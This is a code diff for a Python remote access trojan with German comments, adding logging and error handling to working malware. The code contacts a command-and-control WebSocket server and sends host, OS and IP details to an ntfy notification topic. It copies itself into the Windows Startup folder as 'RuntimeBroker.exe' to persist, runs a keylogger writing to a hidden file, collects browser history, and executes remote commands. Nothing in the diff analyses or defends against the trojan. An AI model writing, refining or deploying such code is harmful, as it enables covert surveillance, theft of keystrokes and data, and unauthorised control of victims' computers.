@@ -16,6 +16,7 @@ import socket
 import urllib.request
 import glob
 from datetime import datetime, timedelta
+import logging
 
 # pynput wird für den Keylogger benötigt
 try:
@@ -28,18 +29,23 @@ SERVER_URI = "wss://yawning-chameleon-norobb-e4dabbb0.koyeb.app:443/rat"
 KEYLOG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".klog.dat")
 NTFY_TOPIC = "RAT_JundN"
 
+logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
+
 # --- Systeminformationsfunktionen ---
 def get_public_ip():
     try:
-        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')
-    except Exception:
+        with urllib.request.urlopen('https://api.ipify.org', timeout=5) as resp:
+            return resp.read().decode('utf8')
+    except Exception as e:
+        logging.warning(f"Fehler beim Abrufen der öffentlichen IP: {e}")
         return "Unbekannt"
 
 def get_local_ips():
     try:
         hostname = socket.gethostname()
         return ", ".join(socket.gethostbyname_ex(hostname)[2])
-    except Exception:
+    except Exception as e:
+        logging.warning(f"Fehler beim Abrufen der lokalen IPs: {e}")
         return "Unbekannt"
 
 def send_ntfy_notification():
@@ -65,7 +71,7 @@ def send_ntfy_notification():
         )
         urllib.request.urlopen(req, timeout=10)
     except Exception as e:
-        print(f"[!] Fehler beim Senden der NTFY-Benachrichtigung: {e}")
+        logging.warning(f"Fehler beim Senden der NTFY-Benachrichtigung: {e}")
 
 def get_system_info():
     try:
@@ -180,25 +186,25 @@ def start_persistent_keylogger():
 def ensure_persistence():
     if platform.system() != "Windows":
         return
-    startup_filename = "RuntimeBroker.exe"
-    source_path = sys.executable
-    startup_folder = os.path.join(
-        os.environ["APPDATA"],
-        "Microsoft",
-        "Windows",
-        "Start Menu",
-        "Programs",
-        "Startup",
-    )
-    dest_path = os.path.join(startup_folder, startup_filename)
-    if source_path.lower() == dest_path.lower():
-        return
-    if not os.path.exists(dest_path):
-        try:
+    try:
+        startup_filename = "RuntimeBroker.exe"
+        source_path = sys.executable
+        startup_folder = os.path.join(
+            os.environ["APPDATA"],
+            "Microsoft",
+            "Windows",
+            "Start Menu",
+            "Programs",
+            "Startup",
+        )
+        dest_path = os.path.join(startup_folder, startup_filename)
+        if source_path.lower() == dest_path.lower():
+            return
+        if not os.path.exists(dest_path):
             os.makedirs(startup_folder, exist_ok=True)
             shutil.copyfile(source_path, dest_path)
-        except Exception:
-            pass
+    except Exception as e:
+        logging.warning(f"Fehler bei Persistenz: {e}")
 
 # --- Browserverlauf-Funktion (erweitert für mehrere Browser) ---
 def get_browser_history(limit=50):
@@ -495,12 +501,11 @@ async def process_commands(websocket):
 async def connect_to_server():
     ensure_persistence()
     start_persistent_keylogger()
-    send_ntfy_notification()  # Sende Systeminformationen bei Start
-
+    send_ntfy_notification()
     while True:
         try:
             async with websockets.connect(SERVER_URI) as websocket:
-                print("[+] Verbunden mit dem Server.")
+                logging.info("[+] Verbunden mit dem Server.")
 
                 # Sende Hostname, OS und IP direkt nach Verbindungsaufbau
                 try:
@@ -516,9 +521,11 @@ async def connect_to_server():
                     pass
 
                 await process_commands(websocket)
-        except (websockets.ConnectionClosed, ConnectionRefusedError):
+        except (websockets.ConnectionClosed, ConnectionRefusedError) as e:
+            logging.warning(f"Verbindung verloren: {e}")
             await asyncio.sleep(10)
-        except Exception:
+        except Exception as e:
+            logging.error(f"Allgemeiner Fehler: {e}")
             await asyncio.sleep(10)
 
 if __name__ == "__main__":
